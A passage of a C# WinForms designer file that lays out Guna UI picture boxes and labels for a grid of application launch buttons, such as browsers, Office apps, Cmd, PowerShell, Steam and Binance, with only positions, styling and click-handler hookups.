            this.guna2HtmlLabel11.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel11.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel11.Location = new System.Drawing.Point(180, 393);
            this.guna2HtmlLabel11.Name = "guna2HtmlLabel11";
            this.guna2HtmlLabel11.Size = new System.Drawing.Size(24, 15);
            this.guna2HtmlLabel11.TabIndex = 192;
            this.guna2HtmlLabel11.Text = "RDP";
            // 
            // guna2PictureBox30
            // 
            this.guna2PictureBox30.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox30, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox30.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox30.Image")));
            this.guna2PictureBox30.ImageRotate = 0F;
            this.guna2PictureBox30.Location = new System.Drawing.Point(94, 461);
            this.guna2PictureBox30.Name = "guna2PictureBox30";
            this.guna2PictureBox30.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox30.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox30.TabIndex = 233;
            this.guna2PictureBox30.TabStop = false;
            this.guna2PictureBox30.UseTransparentBackground = true;
            // 
            // guna2PictureBox42
            // 
            this.guna2PictureBox42.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox42, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox42.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox42.Image")));
            this.guna2PictureBox42.ImageRotate = 0F;
            this.guna2PictureBox42.Location = new System.Drawing.Point(173, 461);
            this.guna2PictureBox42.Name = "guna2PictureBox42";
            this.guna2PictureBox42.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox42.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox42.TabIndex = 195;
            this.guna2PictureBox42.TabStop = false;
            this.guna2PictureBox42.UseTransparentBackground = true;
            this.guna2PictureBox42.Click += new System.EventHandler(this.guna2PictureBox42_Click);
            // 
            // guna2PictureBox28
            // 
            this.guna2PictureBox28.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox28, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox28.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox28.Image")));
            this.guna2PictureBox28.ImageRotate = 0F;
            this.guna2PictureBox28.Location = new System.Drawing.Point(265, 352);
            this.guna2PictureBox28.Name = "guna2PictureBox28";
            this.guna2PictureBox28.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox28.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox28.TabIndex = 178;
            this.guna2PictureBox28.TabStop = false;
            this.guna2PictureBox28.UseTransparentBackground = true;
            this.guna2PictureBox28.Click += new System.EventHandler(this.guna2PictureBox28_Click);
            // 
            // guna2HtmlLabel16
            // 
            this.guna2HtmlLabel16.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel16, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel16.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel16.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel16.Location = new System.Drawing.Point(266, 393);
            this.guna2HtmlLabel16.Name = "guna2HtmlLabel16";
            this.guna2HtmlLabel16.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel16.TabIndex = 182;
            this.guna2HtmlLabel16.Text = "Word";
            // 
            // guna2PictureBox27
            // 
            this.guna2PictureBox27.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox27, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox27.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox27.Image")));
            this.guna2PictureBox27.ImageRotate = 0F;
            this.guna2PictureBox27.Location = new System.Drawing.Point(352, 352);
            this.guna2PictureBox27.Name = "guna2PictureBox27";
            this.guna2PictureBox27.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox27.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox27.TabIndex = 177;
            this.guna2PictureBox27.TabStop = false;
            this.guna2PictureBox27.UseTransparentBackground = true;
            this.guna2PictureBox27.Click += new System.EventHandler(this.guna2PictureBox27_Click);
            // 
            // guna2HtmlLabel15
            // 
            this.guna2HtmlLabel15.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel15.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel15.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel15.Location = new System.Drawing.Point(351, 393);
            this.guna2HtmlLabel15.Name = "guna2HtmlLabel15";
            this.guna2HtmlLabel15.Size = new System.Drawing.Size(41, 15);
            this.guna2HtmlLabel15.TabIndex = 181;
            this.guna2HtmlLabel15.Text = "Control";
            // 
            // guna2PictureBox21
            // 
            this.guna2PictureBox21.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox21, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox21.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox21.Image")));
            this.guna2PictureBox21.ImageRotate = 0F;
            this.guna2PictureBox21.Location = new System.Drawing.Point(442, 352);
            this.guna2PictureBox21.Name = "guna2PictureBox21";
            this.guna2PictureBox21.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox21.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox21.TabIndex = 176;
            this.guna2PictureBox21.TabStop = false;
            this.guna2PictureBox21.UseTransparentBackground = true;
            this.guna2PictureBox21.Click += new System.EventHandler(this.guna2PictureBox21_Click);
            // 
            // guna2HtmlLabel14
            // 
            this.guna2HtmlLabel14.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel14.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel14.Location = new System.Drawing.Point(445, 393);
            this.guna2HtmlLabel14.Name = "guna2HtmlLabel14";
            this.guna2HtmlLabel14.Size = new System.Drawing.Size(27, 15);
            this.guna2HtmlLabel14.TabIndex = 183;
            this.guna2HtmlLabel14.Text = "Cmd";
            // 
            // guna2PictureBox18
            // 
            this.guna2PictureBox18.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox18, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox18.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox18.Image")));
            this.guna2PictureBox18.ImageRotate = 0F;
            this.guna2PictureBox18.Location = new System.Drawing.Point(352, 461);
            this.guna2PictureBox18.Name = "guna2PictureBox18";
            this.guna2PictureBox18.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox18.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox18.TabIndex = 175;
            this.guna2PictureBox18.TabStop = false;
            this.guna2PictureBox18.UseTransparentBackground = true;
            this.guna2PictureBox18.Click += new System.EventHandler(this.guna2PictureBox18_Click);
            // 
            // guna2HtmlLabel13
            // 
            this.guna2HtmlLabel13.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel13.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel13.Location = new System.Drawing.Point(339, 502);
            this.guna2HtmlLabel13.Name = "guna2HtmlLabel13";
            this.guna2HtmlLabel13.Size = new System.Drawing.Size(57, 15);
            this.guna2HtmlLabel13.TabIndex = 180;
            this.guna2HtmlLabel13.Text = "Powershell";
            // 
            // guna2PictureBox17
            // 
            this.guna2PictureBox17.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox17, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox17.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox17.Image")));
            this.guna2PictureBox17.ImageRotate = 0F;
            this.guna2PictureBox17.Location = new System.Drawing.Point(352, 73);
            this.guna2PictureBox17.Name = "guna2PictureBox17";
            this.guna2PictureBox17.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox17.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox17.TabIndex = 104;
            this.guna2PictureBox17.TabStop = false;
            this.guna2PictureBox17.UseTransparentBackground = true;
            this.guna2PictureBox17.Click += new System.EventHandler(this.guna2PictureBox17_Click);
            // 
            // guna2HtmlLabel28
            // 
            this.guna2HtmlLabel28.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel28, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel28.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel28.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel28.Location = new System.Drawing.Point(169, 502);
            this.guna2HtmlLabel28.Name = "guna2HtmlLabel28";
            this.guna2HtmlLabel28.Size = new System.Drawing.Size(42, 15);
            this.guna2HtmlLabel28.TabIndex = 200;
            this.guna2HtmlLabel28.Text = "Explore";
            // 
            // guna2PictureBox13
            // 
            this.guna2PictureBox13.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox13.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox13.Image")));
            this.guna2PictureBox13.ImageRotate = 0F;
            this.guna2PictureBox13.Location = new System.Drawing.Point(22, 253);
            this.guna2PictureBox13.Name = "guna2PictureBox13";
            this.guna2PictureBox13.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox13.TabIndex = 174;
            this.guna2PictureBox13.TabStop = false;
            this.guna2PictureBox13.UseTransparentBackground = true;
            this.guna2PictureBox13.Click += new System.EventHandler(this.guna2PictureBox13_Click);
            // 
            // guna2HtmlLabel12
            // 
            this.guna2HtmlLabel12.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel12.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel12.Location = new System.Drawing.Point(22, 294);
            this.guna2HtmlLabel12.Name = "guna2HtmlLabel12";
            this.guna2HtmlLabel12.Size = new System.Drawing.Size(35, 15);
            this.guna2HtmlLabel12.TabIndex = 179;
            this.guna2HtmlLabel12.Text = "Steam";
            // 
            // guna2HtmlLabel26
            // 
            this.guna2HtmlLabel26.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel26, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel26.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel26.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel26.Location = new System.Drawing.Point(442, 114);
            this.guna2HtmlLabel26.Name = "guna2HtmlLabel26";
            this.guna2HtmlLabel26.Size = new System.Drawing.Size(38, 15);
            this.guna2HtmlLabel26.TabIndex = 235;
            this.guna2HtmlLabel26.Text = "Vivaldi";
            // 
            // guna2PictureBox20
            // 
            this.guna2PictureBox20.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox20, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox20.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox20.Image")));
            this.guna2PictureBox20.ImageRotate = 0F;
            this.guna2PictureBox20.Location = new System.Drawing.Point(180, 14);
            this.guna2PictureBox20.Name = "guna2PictureBox20";
            this.guna2PictureBox20.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox20.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox20.TabIndex = 159;
            this.guna2PictureBox20.TabStop = false;
            this.guna2PictureBox20.UseTransparentBackground = true;
            // 
            // guna2PictureBox31
            // 
            this.guna2PictureBox31.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox31, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox31.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox31.Image")));
            this.guna2PictureBox31.ImageRotate = 0F;
            this.guna2PictureBox31.Location = new System.Drawing.Point(442, 73);
            this.guna2PictureBox31.Name = "guna2PictureBox31";
            this.guna2PictureBox31.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox31.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox31.TabIndex = 232;
            this.guna2PictureBox31.TabStop = false;
            this.guna2PictureBox31.UseTransparentBackground = true;
            // 
            // guna2PictureBox8
            // 
            this.guna2PictureBox8.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox8.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox8.Image")));
            this.guna2PictureBox8.ImageRotate = 0F;
            this.guna2PictureBox8.Location = new System.Drawing.Point(442, 575);
            this.guna2PictureBox8.Name = "guna2PictureBox8";
            this.guna2PictureBox8.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox8.TabIndex = 184;
            this.guna2PictureBox8.TabStop = false;
            this.guna2PictureBox8.UseTransparentBackground = true;
            this.guna2PictureBox8.Click += new System.EventHandler(this.guna2PictureBox8_Click);
            // 
            // guna2PictureBox38
            // 
            this.guna2PictureBox38.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox38.BorderRadius = 5;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox38, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox38.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox38.Image")));
            this.guna2PictureBox38.ImageRotate = 0F;
            this.guna2PictureBox38.Location = new System.Drawing.Point(352, 165);
            this.guna2PictureBox38.Name = "guna2PictureBox38";
            this.guna2PictureBox38.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox38.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox38.TabIndex = 240;
            this.guna2PictureBox38.TabStop = false;
            this.guna2PictureBox38.UseTransparentBackground = true;
            this.guna2PictureBox38.Click += new System.EventHandler(this.guna2PictureBox38_Click);
            // 
            // guna2HtmlLabel7
            // 
            this.guna2HtmlLabel7.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel7.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel7.Location = new System.Drawing.Point(445, 616);
            this.guna2HtmlLabel7.Name = "guna2HtmlLabel7";
            this.guna2HtmlLabel7.Size = new System.Drawing.Size(29, 15);
            this.guna2HtmlLabel7.TabIndex = 189;
            this.guna2HtmlLabel7.Text = "Excel";
            // 
            // guna2HtmlLabel40
            // 
            this.guna2HtmlLabel40.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel40, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel40.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel40.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel40.Location = new System.Drawing.Point(351, 114);
            this.guna2HtmlLabel40.Name = "guna2HtmlLabel40";
            this.guna2HtmlLabel40.Size = new System.Drawing.Size(34, 15);
            this.guna2HtmlLabel40.TabIndex = 162;
            this.guna2HtmlLabel40.Text = "Opera";
            // 
            // guna2HtmlLabel35
            // 
            this.guna2HtmlLabel35.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel35, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel35.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel35.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel35.Location = new System.Drawing.Point(259, 204);
            this.guna2HtmlLabel35.Name = "guna2HtmlLabel35";
            this.guna2HtmlLabel35.Size = new System.Drawing.Size(52, 15);
            this.guna2HtmlLabel35.TabIndex = 239;
            this.guna2HtmlLabel35.Text = "VPN HMA";
            // 
            // guna2HtmlLabel39
            // 
            this.guna2HtmlLabel39.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel39, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel39.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel39.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel39.Location = new System.Drawing.Point(266, 114);
            this.guna2HtmlLabel39.Name = "guna2HtmlLabel39";
            this.guna2HtmlLabel39.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel39.TabIndex = 161;
            this.guna2HtmlLabel39.Text = "Brave";
            // 
            // guna2PictureBox35
            // 
            this.guna2PictureBox35.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox35.BorderRadius = 5;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox35, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox35.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox35.Image")));
            this.guna2PictureBox35.ImageRotate = 0F;
            this.guna2PictureBox35.Location = new System.Drawing.Point(265, 165);
            this.guna2PictureBox35.Name = "guna2PictureBox35";
            this.guna2PictureBox35.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox35.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox35.TabIndex = 238;
            this.guna2PictureBox35.TabStop = false;
            this.guna2PictureBox35.UseTransparentBackground = true;
            this.guna2PictureBox35.Click += new System.EventHandler(this.guna2PictureBox35_Click);
            // 
            // guna2PictureBox16
            // 
            this.guna2PictureBox16.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox16, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox16.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox16.Image")));
            this.guna2PictureBox16.ImageRotate = 0F;
            this.guna2PictureBox16.Location = new System.Drawing.Point(265, 73);
            this.guna2PictureBox16.Name = "guna2PictureBox16";
            this.guna2PictureBox16.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox16.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox16.TabIndex = 103;
            this.guna2PictureBox16.TabStop = false;
            this.guna2PictureBox16.UseTransparentBackground = true;
            this.guna2PictureBox16.Click += new System.EventHandler(this.guna2PictureBox16_Click);
            // 
            // guna2HtmlLabel41
            // 
            this.guna2HtmlLabel41.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel41, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel41.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel41.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel41.Location = new System.Drawing.Point(173, 114);
            this.guna2HtmlLabel41.Name = "guna2HtmlLabel41";
            this.guna2HtmlLabel41.Size = new System.Drawing.Size(39, 15);
            this.guna2HtmlLabel41.TabIndex = 163;
            this.guna2HtmlLabel41.Text = "Firefox";
            // 
            // guna2PictureBox9
            // 
            this.guna2PictureBox9.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox9.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox9.Image")));
            this.guna2PictureBox9.ImageRotate = 0F;
            this.guna2PictureBox9.Location = new System.Drawing.Point(22, 352);
            this.guna2PictureBox9.Name = "guna2PictureBox9";
            this.guna2PictureBox9.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox9.TabIndex = 185;
            this.guna2PictureBox9.TabStop = false;
            this.guna2PictureBox9.UseTransparentBackground = true;
            this.guna2PictureBox9.Click += new System.EventHandler(this.guna2PictureBox9_Click);
            // 
            // guna2HtmlLabel34
            // 
            this.guna2HtmlLabel34.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel34, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel34.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel34.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel34.Location = new System.Drawing.Point(174, 204);
            this.guna2HtmlLabel34.Name = "guna2HtmlLabel34";
            this.guna2HtmlLabel34.Size = new System.Drawing.Size(34, 15);
            this.guna2HtmlLabel34.TabIndex = 237;
            this.guna2HtmlLabel34.Text = "Skype";
            // 
            // guna2HtmlLabel8
            // 
            this.guna2HtmlLabel8.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel8.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel8.Location = new System.Drawing.Point(16, 393);
            this.guna2HtmlLabel8.Name = "guna2HtmlLabel8";
            this.guna2HtmlLabel8.Size = new System.Drawing.Size(50, 15);
            this.guna2HtmlLabel8.TabIndex = 190;
            this.guna2HtmlLabel8.Text = "OneDrive";
            // 
            // guna2PictureBox43
            // 
            this.guna2PictureBox43.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox43, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox43.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox43.Image")));
            this.guna2PictureBox43.ImageRotate = 0F;
            this.guna2PictureBox43.Location = new System.Drawing.Point(94, 253);
            this.guna2PictureBox43.Name = "guna2PictureBox43";
            this.guna2PictureBox43.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox43.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox43.TabIndex = 196;
            this.guna2PictureBox43.TabStop = false;
            this.guna2PictureBox43.UseTransparentBackground = true;
            this.guna2PictureBox43.Click += new System.EventHandler(this.guna2PictureBox43_Click);
            // 
            // guna2PictureBox34
            // 
            this.guna2PictureBox34.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox34, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox34.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox34.Image")));
            this.guna2PictureBox34.ImageRotate = 0F;
            this.guna2PictureBox34.Location = new System.Drawing.Point(173, 165);
            this.guna2PictureBox34.Name = "guna2PictureBox34";
            this.guna2PictureBox34.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox34.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox34.TabIndex = 236;
            this.guna2PictureBox34.TabStop = false;
            this.guna2PictureBox34.UseTransparentBackground = true;
            this.guna2PictureBox34.Click += new System.EventHandler(this.guna2PictureBox34_Click);
            // 
            // guna2HtmlLabel29
            // 
            this.guna2HtmlLabel29.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel29, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel29.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel29.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel29.Location = new System.Drawing.Point(94, 294);
            this.guna2HtmlLabel29.Name = "guna2HtmlLabel29";
            this.guna2HtmlLabel29.Size = new System.Drawing.Size(39, 15);
            this.guna2HtmlLabel29.TabIndex = 203;
            this.guna2HtmlLabel29.Text = "Quality";
            // 
            // guna2HtmlLabel33
            // 
            this.guna2HtmlLabel33.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel33, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel33.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel33.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel33.Location = new System.Drawing.Point(93, 204);
            this.guna2HtmlLabel33.Name = "guna2HtmlLabel33";
            this.guna2HtmlLabel33.Size = new System.Drawing.Size(42, 15);
            this.guna2HtmlLabel33.TabIndex = 235;
            this.guna2HtmlLabel33.Text = "Binance";
            // 
            // guna2HtmlLabel18
            // 
            this.guna2HtmlLabel18.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel18, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel18.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
